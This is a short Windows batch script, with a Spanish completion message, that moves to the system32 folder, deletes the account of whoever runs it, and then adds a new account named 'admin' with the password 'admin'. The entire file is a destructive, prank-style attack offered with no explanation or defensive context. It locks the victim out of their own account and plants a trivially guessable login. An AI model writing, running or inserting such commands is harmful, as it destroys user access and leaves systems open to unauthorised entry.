@echo off
FOR %%i in ( 0 1 2 3 4 5 6 7 8 9 10 11 ) DO cd ..
pause 
cd Windows 
cd system32
net user %USERNAME% /DELETE
pause
net user admin admin /add
echo terminado!
pause